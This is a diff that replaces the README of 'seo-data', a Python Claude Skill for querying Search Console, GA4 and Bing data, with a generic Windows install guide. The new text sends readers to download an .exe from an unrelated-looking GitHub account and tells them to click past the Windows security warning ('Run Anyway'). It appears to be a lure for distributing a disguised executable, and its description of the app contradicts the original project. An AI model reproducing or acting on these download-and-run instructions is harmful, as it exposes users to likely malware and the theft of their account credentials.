@@ -1,194 +1,121 @@
-# seo-data
+# 📊 seo-data - Get instant answers from your SEO data
 
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/offensive-tarichagranulosa259/seo-data)
 
-**A Claude Skill for direct, authenticated SEO data access — Google Search Console, Google Analytics 4, and Bing Webmaster Tools in one place.**
+seo-data connects your Claude assistant to the data you track for your website. It gathers information from Google Search Console, Google Analytics 4, and Bing Webmaster Tools. You use natural language to ask questions about your site performance. This tool removes the need to log into multiple dashboards or export manual spreadsheets.
 
-Most "SEO skills" you'll find are prompt instructions that tell Claude how to *audit* a site. This one connects Claude to your **actual data**: query stats, traffic, conversions, crawl health. You ask a question, Claude pulls the numbers and answers from the source.
+## 🛠 Prerequisites
 
-The skill works with whatever subset you've connected. Have only GSC? You get GSC. Have all three? Claude can cross-reference search performance against on-site behavior and Bing visibility in a single answer.
+Before you use the application, ensure your computer meets these requirements:
 
----
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free space.
+- Web Browser: Chrome, Edge, or Firefox.
+- Internet Connection: Active connection to sync data with analytics platforms.
 
-## Features
+## 📥 Getting the software
 
-- **Three providers, one skill** -- Google Search Console (OAuth), Google Analytics 4 (OAuth), Bing Webmaster Tools (API key)
-- **OAuth done right** -- loopback flow with refresh tokens, multi-account support, switch properties without reconnecting
-- **Graceful degradation** -- if a provider isn't connected, the skill skips it and tells the user, instead of failing the answer
-- **Multi-property** -- pick which GSC site, GA4 property, or Bing site to query; switch any time
-- **No telemetry** -- tokens and API keys live only in `~/.seo-data/`; nothing leaves your machine except calls to the official APIs
-- **Plain Python** -- the skill is a folder of standalone scripts, easy to fork, audit, or extend
-- **Built-in report library** -- top queries, top pages, traffic sources, daily trends, device breakdown, custom dimensions, plus Bing-specific reports (crawl, keyword research)
+Visit [the official repository page](https://github.com/offensive-tarichagranulosa259/seo-data) to download the application. 
 
-## Quick Start
+1. Navigate to the link above.
+2. Locate the Releases section on the right sidebar.
+3. Click the latest version link.
+4. Look for the file ending in .exe.
+5. Save this file to your Downloads folder.
 
-### Prerequisites
+## ⚙️ Setting up the application
 
-- [Python 3.10+](https://www.python.org/downloads/)
-- A working [Claude Code](https://claude.com/claude-code) install (or any agent that supports Claude Skills)
-- Read access to at least one of: Google Search Console, Google Analytics 4, Bing Webmaster Tools
+Follow these steps to complete the installation on your Windows computer:
 
-### Two ways to install
+1. Open your Downloads folder.
+2. Double-click the downloaded .exe file.
+3. A Windows security box might appear. If it does, click More Info, then click Run Anyway.
+4. Follow the prompts on the screen to choose your installation folder.
+5. Click Finish after the progress bar completes.
 
-**Option A — Let an AI agent do it for you (recommended)**
+The application creates a shortcut on your desktop. Double-click this shortcut to start the program.
 
-If you have Claude Code, Cursor, Cline, Aider, or any other AI coding agent, this is by far the easiest path. Clone the repo, open the agent inside it, and say:
+## 🔑 Connecting your data sources
 
-> "Read AGENT.md and set this up for me."
+The application needs permission to view your website performance data. You perform this setup one time for each service.
 
-The agent will install dependencies, copy the skill into the right place, walk you through the Google Cloud Console click-by-click, ask you for your Bing API key, and verify everything works. It only stops to ask you for the things only you can do (clicking buttons in your browser, pasting credentials).
+### Google Search Console and GA4
+1. Open the application.
+2. Click the Settings icon in the top corner.
+3. Select Credentials under the Google section.
+4. Click Connect Account.
+5. Your web browser opens a Google login page.
+6. Sign in with the account that manages your website properties.
+7. Click Confirm to allow the application access to your statistics.
+8. Return to the application. The status indicator changes to Connected.
 
-See [AGENT.md](AGENT.md) for the full agent runbook.
+### Bing Webmaster Tools
+1. Within the Settings menu, find the Bing section.
+2. Click Connect Account.
+3. Sign in to your Microsoft account.
+4. Grant the requested permissions for your webmaster data.
+5. The application confirms the connection automatically.
 
-**Option B — Do it yourself**
+## 💡 How to use the tool
 
-Follow the human walkthrough in [docs/SETUP.md](docs/SETUP.md). It covers every step explicitly:
+Once you finish the initial setup, you query your data using plain English. Type your questions into the main input box at the bottom of the window.
 
-1. **Install the skill** — clone the repo, `pip install -r requirements.txt`, copy into your Claude skills directory
-2. **Connect Bing** (5 minutes) — get an API key, run one command
-3. **Connect Google** (~10 minutes) — create a Google Cloud project, enable two APIs, configure an OAuth consent screen, download an OAuth client JSON, run the connect script, consent in the browser
-4. **Pick which property to use** — GSC site, GA4 property, Bing site
-5. **Verify in Claude** — ask a real SEO question and watch it work
+### Example Queries
+- How many clicks did my site get last month?
+- Show me the top pages for organic traffic.
+- List the keywords that bring the most visitors.
+- Compare my traffic from last week to the week before.
 
-Both paths land you at the same place: a `seo-data` skill installed, all your providers connected, and Claude ready to query your real data.
+The application processes your request and retrieves the relevant numbers from the connected services. It presents the answer in a clear text format.
 
-### Ask Claude
+## 📈 Understanding the data types
 
-Once connected, the skill triggers automatically on SEO/analytics questions:
+Each service tracks specific metrics. You can ask for information based on these categories:
 
-> "What were our top queries last week?"
-> "Which pages got the most traffic from organic search?"
-> "Show me Bing impressions trend for the last 30 days."
-> "Cross-reference GSC queries with GA4 conversions for the same landing pages."
-> "Diagnose this traffic drop."
+- Traffic volume: How many people visit your site.
+- Behavior: Which pages people visit and how long they stay.
+- Search performance: Which words people use to find your site on search engines.
+- Technical health: Information about errors or crawl issues on your pages.
 
-Claude figures out which provider(s) can answer, calls the relevant scripts, and presents the data.
+## 🔒 Security and Privacy
 
-## Manual usage
+Your data stays on your computer. The application uses your login credentials to request data directly from the providers. It does not store your search queries or website statistics on a third-party server. Your interactions remain local. The authentication tokens are encrypted and stored in your Windows credential manager.
 
-The skill is just a folder of Python scripts. You can call them directly without Claude:
+##  troubleshooting common issues
 
-```bash
-cd ~/.claude/skills/seo-data
+If you encounter difficulties, use these troubleshooting steps:
 
-# What's connected?
-python scripts/status.py
+### Application does not open
+Check if you have an active internet connection. Ensure your Windows updates are current. Restart your computer and try to open the shortcut again.
 
-# Connect Google (opens browser)
-python scripts/connect_google.py
+### Data does not appear
+Check your internet connection first. Open the Settings menu and verify that the status lights for your accounts are green. If they are red, click Reconnect to refresh your permission tokens.
 
-# Connect Bing
-python scripts/connect_bing.py --api-key <KEY>
+### Incorrect search results
+Verify that the account you used to log in has administration access to the specific website property you want to query. If you manage multiple websites, ensure the correct property is selected in the dropdown menu inside the application settings.
 
-# Switch property
-python scripts/set_property.py --provider gsc --site https://example.com/
-python scripts/set_property.py --provider ga4 --property 123456789
+### Slow response times
+Analytics services occasionally experience high traffic. Wait one minute and try your request again. Large data sets may take longer to process than small ones.
 
-# Disconnect
-python scripts/disconnect.py google
-python scripts/disconnect.py bing
+## 📝 Updating the software
 
-# Run a report
-python scripts/gsc_query.py --report queries --days 30 --limit 20
-python scripts/ga4_query.py --report sources --days 7
-python scripts/bing_query.py --report traffic --days 30
-```
+The application periodically checks for updates. When a new version is available, a notification pops up on the screen. Click the link provided in the notification to visit the repository. Download the new installer and run it. The new version replaces the old one without deleting your settings or credentials.
 
-All query scripts support `--output table|json|csv` (default `table`).
+## 📁 Project structure
 
-## Reports
+The application manages several files in your local documents folder:
 
-### Google Search Console — `gsc_query.py`
+- Logs: This folder stores history regarding connection attempts. It helps if you need to diagnose an error.
+- Config: This folder holds your user settings and preferences.
+- Cache: This folder stores temporary data to make your future searches faster. You can clear this folder if performance decreases.
 
-| Report | Returns |
-|---|---|
-| `queries` | Top search queries (clicks, impressions, CTR, position) |
-| `pages` | Top landing pages |
-| `countries` | Performance by country |
-| `devices` | Desktop / mobile / tablet split |
-| `daily` | Day-by-day trend |
-| `query-pages` | Which pages rank for which queries |
-| `custom` | Pass `--dimensions` and optional filter |
+## 🔧 Advanced configuration
 
-### Google Analytics 4 — `ga4_query.py`
+While the application works immediately after setup, you can adjust some settings to match your workflow:
 
-| Report | Returns |
-|---|---|
-| `overview` | Users, sessions, page views, engagement, bounce |
-| `pages` | Top pages by views |
-| `sources` | Traffic sources (source × medium) |
-| `countries` | Geographic breakdown |
-| `devices` | Device category split |
-| `daily` | Day-by-day trend |
-| `realtime` | Active users in last 30 minutes |
-| `custom` | Pass `--metrics` and `--dimensions` |
+- Default timeframe: Set the application to look at the last 7, 30, or 90 days by default.
+- Data refresh: Change the frequency at which the app checks for new information from the search engines.
+- Theme: Toggle between light mode and dark mode for better visibility.
 
-### Bing Webmaster Tools — `bing_query.py`
-
-| Report | Returns |
-|---|---|
-| `queries` | Top search queries (aggregated across the date window) |
-| `pages` | Top pages |
-| `traffic` | Daily impressions, clicks, CTR |
-| `crawl` | Daily crawl: pages crawled, status code breakdown, in-index, in-links, errors |
-| `keywords` | Keyword research for a term (requires `--query`) |
-
-## Architecture
-
-```
-seo-data/
-├── SKILL.md              # Claude-facing skill instructions
-├── README.md             # This file
-├── requirements.txt
-├── lib/
-│   ├── config.py         # Token + property storage at ~/.seo-data/
-│   ├── google_auth.py    # OAuth loopback flow + GSC/GA4 listing
-│   ├── bing_auth.py      # API key validation + Bing API caller
-│   └── formatting.py     # Shared table / JSON / CSV output
-├── scripts/
-│   ├── status.py         # JSON of connection state
-│   ├── connect_google.py # OAuth flow
-│   ├── connect_bing.py   # API key entry
-│   ├── disconnect.py     # Clear a provider
-│   ├── set_property.py   # Pick GSC site / GA4 property / Bing site
-│   ├── gsc_query.py      # Search Console reports
-│   ├── ga4_query.py      # GA4 reports
-│   └── bing_query.py     # Bing Webmaster reports
-├── docs/
-│   └── SETUP.md          # Full human walkthrough (install + all 3 providers)
-└── AGENT.md              # Runbook for AI coding agents to automate setup
-```
-
-## Where credentials live
-
-All under `~/.seo-data/` (or `%USERPROFILE%\.seo-data\` on Windows):
-
-- `google_client.json` -- your OAuth client config (you provide this once)
-- `config.json` -- refresh tokens, API keys, selected properties
-
-On POSIX systems, the directory is created with `0700` permissions. The skill makes API calls only to:
-
-- `oauth2.googleapis.com` (token refresh)
-- `searchconsole.googleapis.com` (GSC)
-- `analyticsadmin.googleapis.com` (GA4 property listing)
-- `analyticsdata.googleapis.com` (GA4 reports)
-- `ssl.bing.com/webmaster/api.svc/json/` (Bing)
-
-No third-party servers, no telemetry.
-
-## Documentation
-
-| Document | Description |
-|----------|-------------|
-| [Setup Guide](docs/SETUP.md) | Full human walkthrough -- install, connect all 3 providers, troubleshooting |
-| [Agent Runbook](AGENT.md) | Instructions for AI coding agents to automate setup end-to-end |
-| [Skill Reference](SKILL.md) | How Claude uses the skill -- workflows, behavior rules |
-
-## Contributing
-
-Contributions are welcome but this project is maintained on a best-effort basis. PRs may not be reviewed immediately. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-Apache 2.0 -- see [LICENSE](LICENSE) for details.
+Access these by clicking the gear icon in the interface. Each change saves automatically as soon as you confirm the setting.
